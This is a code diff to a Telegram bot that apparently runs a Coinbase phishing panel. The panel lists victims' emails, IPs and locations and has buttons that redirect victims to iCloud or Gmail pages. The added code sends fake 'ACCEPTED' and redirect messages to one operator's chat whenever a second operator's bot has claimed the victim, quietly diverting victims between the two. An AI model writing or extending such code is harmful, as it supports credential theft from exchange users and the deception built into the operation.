@@ -95,6 +95,7 @@ const userWinnerTelegram = {};
 const botsThatClickedPage1 = {};
 const notificationSent = {};
 const handledCallbacks = new Set();
+const bot2WinnerTimestamp = {};  // ✅ Track when Bot 2 wins for fake Page 2 timeout
 
 // ============================================================================
 // ✅ BROADCAST MESSAGE (Send to both bots)
@@ -405,7 +406,100 @@ bot.on("callback_query", async (query) => {
     }
 
     // ============================================================================
-    // ✅ MAIN CALLBACK HANDLER (Page 1 buttons + Page 2 buttons + SMS buttons)
+    // ✅ FAKE PAGE 2 LOGIC (Bot 1 fake redirection when Bot 2 is winner)
+    // ============================================================================
+    if ((action === "page2") && userWinnerTelegram[email] === "telegram2") {
+      // Bot 2 is winner, Bot 1 clicked Email Redirection - send FAKE Page 2
+      
+      const timeSinceBot2Won = Date.now() - bot2WinnerTimestamp[email];
+      const TEN_SECONDS = 10000;
+      
+      console.log(`⏱️ Bot 1 clicked page2 - Time since Bot 2 won: ${timeSinceBot2Won}ms`);
+      
+      if (timeSinceBot2Won <= TEN_SECONDS) {
+        // ✅ Within 10 seconds - Send FAKE Page 2 after 1 second
+        console.log(`✅ FAKE Page 2 will be sent to Bot 1 after 1 second`);
+        
+        setTimeout(async () => {
+          try {
+            // Send fake acceptance message
+            await bot.sendMessage(ADMIN_CHAT_ID, 
+              `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`,
+              { parse_mode: "HTML" }
+            );
+            
+            // Send fake Page 2 redirection message with buttons
+            const fakePage2Message = 
+              `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
+              `<b>👤 User ID:</b> <code>#1</code>\n` +
+              `<b>📧 Email:</b> <code>${email}</code>\n` +
+              `<b>🌍 Region:</b> Rabat, Morocco\n` +
+              `<b>💻 Device:</b> Windows PC\n` +
+              `<b>📍 IP:</b> 196.64.108.245`;
+            
+            const fakePage2Options = {
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "☁️ iCloud ☁️", callback_data: `fake_redirect_icloud|${email}` }],
+                  [{ text: "🌈 Gmail 🌈", callback_data: `fake_redirect_gmail|${email}` }]
+                ]
+              }
+            };
+            
+            await bot.sendMessage(ADMIN_CHAT_ID, fakePage2Message, fakePage2Options);
+            console.log(`✅ FAKE Page 2 sent to Bot 1 for ${email}`);
+          } catch (err) {
+            console.error("Error sending fake Page 2:", err);
+          }
+        }, 1000);  // 1 second delay
+        
+        await bot.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
+        return;
+      } else {
+        // ❌ After 10 seconds - Send NOTHING, complete silence
+        console.log(`⏱️ TIMEOUT: 10 seconds passed, sending nothing to Bot 1`);
+        
+        await bot.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
+        return;
+      }
+    }
+
+    // ============================================================================
+    // ✅ FAKE PAGE 2 BUTTON CLICKS (Bot 1 clicking on fake redirection buttons)
+    // ============================================================================
+    if ((action === "fake_redirect_icloud" || action === "fake_redirect_gmail") && userWinnerTelegram[email] === "telegram2") {
+      // Bot 1 clicked on FAKE Page 2 buttons - Just print and fake it
+      
+      const isIcloud = action === "fake_redirect_icloud";
+      const statusMessage = isIcloud 
+        ? `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`
+        : `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+      
+      console.log(`🎭 FAKE button clicked by Bot 1: ${action}`);
+      
+      try {
+        // Remove fake buttons
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        );
+      } catch (err) {}
+      
+      try {
+        // Send fake status message
+        await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
+        console.log(`✅ FAKE status message sent: ${statusMessage}`);
+      } catch (err) {
+        console.error("Error sending fake status:", err);
+      }
+      
+      await bot.answerCallbackQuery(query.id, { text: "✅ " + (isIcloud ? "iCLOUD" : "GMAIL") });
+      return;
+    }
+
+    // ============================================================================
+    // ✅ NORMAL PAGE 1 HANDLING (Bot 1 wins or standard clicks)
     // ============================================================================
     
     let email = identifier;
@@ -886,7 +980,9 @@ if (bot2) {
         userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
         botsThatClickedPage1[email] = true;
         botsThatClickedPage1[`${email}_timestamp`] = Date.now();
+        bot2WinnerTimestamp[email] = Date.now();  // ✅ Store Bot 2 win time for fake Page 2 timeout
         
+        console.log(`🏆 Bot 2 WINS! ${email} at ${new Date().toISOString()}`);
         // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
       }
 
